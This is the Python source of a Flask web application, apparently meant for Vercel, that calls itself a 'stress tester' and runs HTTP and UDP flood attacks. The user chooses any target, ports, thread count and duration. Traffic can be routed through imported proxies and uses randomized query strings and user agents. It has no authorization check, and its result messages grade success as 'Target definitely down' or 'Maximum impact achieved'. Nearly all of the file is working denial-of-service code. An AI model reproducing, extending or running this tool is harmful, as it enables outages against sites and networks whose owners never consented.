from flask import Flask, render_template, request, jsonify
import threading
import time
import random
import socket
import os
import json
from concurrent.futures import ThreadPoolExecutor
import requests
from datetime import datetime

app = Flask(__name__)

# Global storage - in production, use a proper database
attack_status = {
    'is_running': False,
    'requests_sent': 0,
    'successful_requests': 0,
    'failed_requests': 0,
    'packets_sent': 0,
    'current_method': '',
    'start_time': None,
    'rps_history': [],
    'current_rps': 0,
    'avg_rps': 0,
    'active_connections': [],
    'test_logs': [],
    'final_results': None
}

proxies_list = []
active_proxies = []

class WebNetworkTester:
    def __init__(self):
        self.is_testing = False
        
    def log_message(self, message):
        """Add message to test logs with timestamp"""
        try:
            timestamp = datetime.now().strftime("%H:%M:%S")
            log_entry = f"[{timestamp}] {message}"
            attack_status['test_logs'].append(log_entry)
            # Keep only last 50 log entries to prevent memory issues
            attack_status['test_logs'] = attack_status['test_logs'][-50:]
        except Exception as e:
            print(f"Logging error: {e}")

    def safe_http_request(self, target, port, proxy_config=None):
        """Safe HTTP request with error handling"""
        try:
            if proxy_config:
                proxies = {
                    'http': f"{proxy_config['type'].lower()}://{proxy_config['address']}:{proxy_config['port']}",
                    'https': f"{proxy_config['type'].lower()}://{proxy_config['address']}:{proxy_config['port']}"
                }
                response = requests.get(
                    f"http://{target}:{port}/?{random.randint(1000,9999)}", 
                    timeout=2,
                    headers={'User-Agent': self.get_random_ua()},
                    proxies=proxies
                )
            else:
                response = requests.get(
                    f"http://{target}:{port}/?{random.randint(1000,9999)}", 
                    timeout=2,
                    headers={'User-Agent': self.get_random_ua()}
                )
            return True
        except:
            return False

    def ultra_http_flood(self, target, ports, duration, threads_count, max_requests, use_proxies):
        """HTTP Flood attack with multiple ports and proxy support"""
        end_time = time.time() + duration
        request_count = 0
        start_time = time.time()
        
        self.log_message(f"🚀 STARTING ULTRA STRESS TEST: ULTRA_HTTP")
        self.log_message(f"🎯 Target: {target}")
        self.log_message(f"🔢 Ports: {ports}")
        self.log_message(f"⏱️ Duration: {duration}s")
        self.log_message(f"🧵 Threads: {threads_count}")
        self.log_message(f"📨 Requests: {max_requests if max_requests > 0 else 'Unlimited'}")
        self.log_message(f"🔌 Use Proxies: {'Yes' if use_proxies else 'No'}")
        self.log_message("=" * 50)
        
        # Limit threads for serverless environment
        threads_count = min(threads_count, 20)
        
        def worker(worker_id):
            nonlocal request_count
            local_count = 0
            
            while (time.time() < end_time and self.is_testing and 
                   (max_requests == 0 or request_count < max_requests)):
                try:
                    port = random.choice(ports)
                    
                    # Get proxy if enabled
                    proxy_config = None
                    if use_proxies and active_proxies:
                        proxy_config = random.choice(active_proxies)
                    
                    # Make request
                    success = self.safe_http_request(target, port, proxy_config)
                    
                    if success:
                        attack_status['successful_requests'] += 1
                    else:
                        attack_status['failed_requests'] += 1
                    
                    local_count += 1
                    request_count += 1
                    attack_status['requests_sent'] += 1
                    
                    # Log progress every 100 requests (less frequent for serverless)
                    if local_count % 100 == 0:
                        proxy_info = f" via {proxy_config['address']}" if proxy_config else ""
                        self.log_message(f"🚀 Worker {worker_id}: {local_count} requests{proxy_info}")
                    
                    # Update RPS calculations
                    self.update_rps_stats()
                    
                except Exception as e:
                    attack_status['failed_requests'] += 1
                    request_count += 1
                    attack_status['requests_sent'] += 1
        
        try:
            with ThreadPoolExecutor(max_workers=threads_count) as executor:
                futures = [executor.submit(worker, i) for i in range(threads_count)]
                for future in futures:
                    future.result(timeout=duration + 5)  # Add timeout
        except Exception as e:
            self.log_message(f"❌ Thread pool error: {str(e)}")
        
        # Log final results
        self.log_http_results(start_time, request_count)

    def enhanced_udp_flood(self, target, ports, duration, threads_count, max_requests, use_proxies):
        """Enhanced UDP Flood attack"""
        end_time = time.time() + duration
        packet_size = 512  # Reduced for serverless
        request_count = 0
        bytes_sent = 0
        start_time = time.time()
        
        self.log_message(f"🚀 STARTING ULTRA STRESS TEST: ENHANCED_UDP")
        self.log_message(f"🎯 Target: {target}")
        self.log_message(f"🔢 Ports: {ports}")
        self.log_message(f"⏱️ Duration: {duration}s")
        self.log_message(f"🧵 Threads: {threads_count}")
        self.log_message(f"📨 Requests: {max_requests if max_requests > 0 else 'Unlimited'}")
        self.log_message(f"🔌 Use Proxies: {'Yes' if use_proxies else 'No'}")
        self.log_message("=" * 50)
        self.log_message(f"🚀 Starting ENHANCED UDP Flood: {threads_count} workers, {packet_size} byte packets")
        
        # Limit threads for serverless environment
        threads_count = min(threads_count, 10)
        
        def udp_worker(worker_id):
            nonlocal request_count, bytes_sent
            local_count = 0
            
            while (time.time() < end_time and self.is_testing and 
                   (max_requests == 0 or request_count < max_requests)):
                try:
                    port = random.choice(ports)
                    
                    # Create and send UDP packet
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    sock.settimeout(1)  # Add timeout
                    payload = os.urandom(packet_size)
                    sock.sendto(payload, (target, port))
                    sock.close()
                    
                    attack_status['packets_sent'] += 1
                    request_count += 1
                    local_count += 1
                    bytes_sent += len(payload)
                    attack_status['requests_sent'] += 1
                    
                    # Log progress every 50 packets
                    if local_count % 50 == 0:
                        self.log_message(f"📦 UDP Worker {worker_id}: {local_count} packets")
                    
                    # Update RPS calculations
                    self.update_rps_stats()
                    
                except Exception as e:
                    attack_status['failed_requests'] += 1
                    request_count += 1
                    attack_status['requests_sent'] += 1
        
        try:
            with ThreadPoolExecutor(max_workers=threads_count) as executor:
                futures = [executor.submit(udp_worker, i) for i in range(threads_count)]
                for future in futures:
                    future.result(timeout=duration + 5)  # Add timeout
        except Exception as e:
            self.log_message(f"❌ UDP Thread pool error: {str(e)}")
        
        # Log final results
        self.log_udp_results(start_time, request_count, bytes_sent)

    def update_rps_stats(self):
        """Update RPS calculations"""
        try:
            current_time = time.time()
            if attack_status['start_time']:
                elapsed = current_time - attack_status['start_time']
                if elapsed > 0:
                    attack_status['current_rps'] = attack_status['requests_sent'] / elapsed
                    attack_status['rps_history'].append(attack_status['current_rps'])
                    attack_status['rps_history'] = attack_status['rps_history'][-20:]  # Reduced for serverless
                    if attack_status['rps_history']:
                        attack_status['avg_rps'] = sum(attack_status['rps_history']) / len(attack_status['rps_history'])
        except Exception as e:
            print(f"RPS stats error: {e}")

    def log_http_results(self, start_time, total_requests):
        """Log HTTP flood final results"""
        try:
            end_time = time.time()
            elapsed = end_time - start_time
            rps = total_requests / elapsed if elapsed > 0 else 0
            
            self.log_message("=" * 50)
            self.log_message("📊 ULTRA HTTP FLOOD COMPLETED:")
            self.log_message(f"   ✅ Total Requests: {total_requests:,}")
            self.log_message(f"   ⏱️ Duration: {elapsed:.2f}s")
            self.log_message(f"   🚀 Average RPS: {rps:,.2f}")
            self.log_message(self.get_performance_rating(rps))
            self.log_final_summary(start_time, total_requests)
        except Exception as e:
            self.log_message(f"❌ Error logging HTTP results: {str(e)}")

    def log_udp_results(self, start_time, total_packets, total_bytes):
        """Log UDP flood final results"""
        try:
            end_time = time.time()
            elapsed = end_time - start_time
            packets_per_second = total_packets / elapsed if elapsed > 0 else 0
            mb_per_second = (total_bytes / (1024 * 1024)) / elapsed if elapsed > 0 else 0
            
            self.log_message("=" * 50)
            self.log_message("📊 ENHANCED UDP FLOOD COMPLETED:")
            self.log_message(f"   📦 Total Packets: {total_packets:,}")
            self.log_message(f"   💾 Total Data: {total_bytes / (1024*1024):.1f} MB")
            self.log_message(f"   ⏱️ Duration: {elapsed:.2f}s")
            self.log_message(f"   🚀 Packets/Second: {packets_per_second:,.0f}")
            self.log_message(f"   📊 Bandwidth: {mb_per_second:.1f} MB/s")
            
            if packets_per_second > 5000:
                self.log_message("   💥 NUCLEAR UDP FLOOD - Maximum impact achieved!")
            elif packets_per_second > 2000:
                self.log_message("   ⚡ EXTREME UDP FLOOD - Heavy impact!")
            elif packets_per_second > 500:
                self.log_message("   🔥 HIGH INTENSITY - Good impact!")
            
            self.log_final_summary(start_time, total_packets)
        except Exception as e:
            self.log_message(f"❌ Error logging UDP results: {str(e)}")

    def log_final_summary(self, start_time, total_requests):
        """Log final summary for all attack types"""
        try:
            end_time = time.time()
            elapsed = end_time - start_time
            rps = total_requests / elapsed if elapsed > 0 else 0
            
            self.log_message("=" * 50)
            self.log_message("📊 STRESS TEST COMPLETED:")
            self.log_message(f"   ✅ Total Requests: {total_requests:,}")
            self.log_message(f"   ⏱️ Duration: {elapsed:.2f}s")
            self.log_message(f"   🚀 Average RPS: {rps:,.2f}")
            self.log_message(self.get_performance_rating(rps))
        except Exception as e:
            self.log_message(f"❌ Error logging final summary: {str(e)}")

    def get_performance_rating(self, rps):
        """Get performance rating based on RPS"""
        if rps > 5000:
            return "   💥 NUCLEAR LOAD GENERATED - Target definitely down"
        elif rps > 2000:
            return "   ⚡ EXTREME LOAD GENERATED - Target likely crashed"
        elif rps > 500:
            return "   🔥 HIGH LOAD GENERATED - Target severely impacted"
        elif rps > 100:
            return "   ⚡ MEDIUM LOAD - Target may be stressed"
        else:
            return "   🔧 LIGHT LOAD - Target may handle this"

    def get_random_ua(self):
        """Get random user agent"""
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
        ]
        return random.choice(user_agents)

# Initialize tester
tester = WebNetworkTester()

# Simple proxy management for serverless
def load_proxies():
    global proxies_list, active_proxies
    proxies_list = []
    active_proxies = []

def save_proxies():
    pass

# Initialize proxies
load_proxies()

@app.route('/')
def index():
    """Main page"""
    try:
        return render_template('index.html')
    except Exception as e:
        return f"Error loading page: {str(e)}", 500

@app.route('/get_proxies')
def get_proxies():
    """Get current proxies"""
    try:
        return jsonify({
            'proxies': proxies_list,
            'active_count': len(active_proxies),
            'total_count': len(proxies_list)
        })
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/add_proxy', methods=['POST'])
def add_proxy():
    """Add a new proxy"""
    try:
        data = request.json
        proxy = {
            'type': data.get('type', 'HTTP'),
            'address': data['address'],
            'port': int(data['port']),
            'username': data.get('username', ''),
            'password': data.get('password', '')
        }
        
        # Check for duplicates
        if not any(p['address'] == proxy['address'] and p['port'] == proxy['port'] for p in proxies_list):
            proxies_list.append(proxy)
            active_proxies.append(proxy)
            return jsonify({'status': 'success', 'message': 'Proxy added successfully'})
        else:
            return jsonify({'status': 'error', 'message': 'Proxy already exists'})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/import_proxies', methods=['POST'])
def import_proxies():
    """Import proxies in bulk"""
    try:
        data = request.json
        text = data['text']
        imported = 0
        errors = 0
        
        lines = text.split('\n')
        for line in lines:
            line = line.strip()
            if not line:
                continue
            
            try:
                if ':' in line:
                    parts = line.split(':')
                    if len(parts) >= 2:
                        proxy_type = "HTTP"
                        address = parts[0]
                        port = int(parts[1])
                        
                        proxy = {
                            'type': proxy_type,
                            'address': address,
                            'port': port,
                            'username': '',
                            'password': ''
                        }
                        
                        if not any(p['address'] == address and p['port'] == port for p in proxies_list):
                            proxies_list.append(proxy)
                            active_proxies.append(proxy)
                            imported += 1
                        else:
                            errors += 1
            except:
                errors += 1
        
        return jsonify({
            'status': 'success', 
            'message': f'Imported {imported} proxies, {errors} failed'
        })
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/start_attack', methods=['POST'])
def start_attack():
    """Start a stress test attack"""
    try:
        data = request.json
        target = data['target']
        ports = [int(p.strip()) for p in data['ports'].split(',')]
        duration = int(data['duration'])
        threads = int(data['threads'])
        max_requests = int(data['max_requests'])
        method = data['method']
        use_proxies = data.get('use_proxies', False)
        
        # Limit values for serverless safety
        duration = min(duration, 30)  # Max 30 seconds
        threads = min(threads, 20)    # Max 20 threads
        max_requests = min(max_requests, 1000)  # Max 1000 requests
        
        # Reset status and logs
        attack_status.update({
            'is_running': True,
            'requests_sent': 0,
            'successful_requests': 0,
            'failed_requests': 0,
            'packets_sent': 0,
            'current_method': method,
            'start_time': time.time(),
            'rps_history': [],
            'current_rps': 0,
            'avg_rps': 0,
            'active_connections': [],
            'test_logs': [],
            'final_results': None
        })
        
        # Start attack in background thread
        def run_attack():
            tester.is_testing = True
            try:
                if method == 'http_flood':
                    tester.ultra_http_flood(target, ports, duration, threads, max_requests, use_proxies)
                elif method == 'udp_flood':
                    tester.enhanced_udp_flood(target, ports, duration, threads, max_requests, use_proxies)
                # Note: Removed slowloris and mixed for serverless compatibility
            except Exception as e:
                tester.log_message(f"❌ Stress test error: {str(e)}")
            finally:
                tester.is_testing = False
                attack_status['is_running'] = False
        
        thread = threading.Thread(target=run_attack)
        thread.daemon = True
        thread.start()
        
        return jsonify({'status': 'Attack started'})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/attack_status')
def get_attack_status():
    """Get current attack status"""
    try:
        return jsonify(attack_status)
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/stop_attack')
def stop_attack():
    """Stop current attack"""
    try:
        tester.is_testing = False
        attack_status['is_running'] = False
        return jsonify({'status': 'Attack stopped'})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/clear_logs')
def clear_logs():
    """Clear test logs"""
    try:
        attack_status['test_logs'] = []
        return jsonify({'status': 'Logs cleared'})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

# Vercel serverless handler
def handler(request):
    return app(request)

if __name__ == '__main__':
    app.run(debug=True)
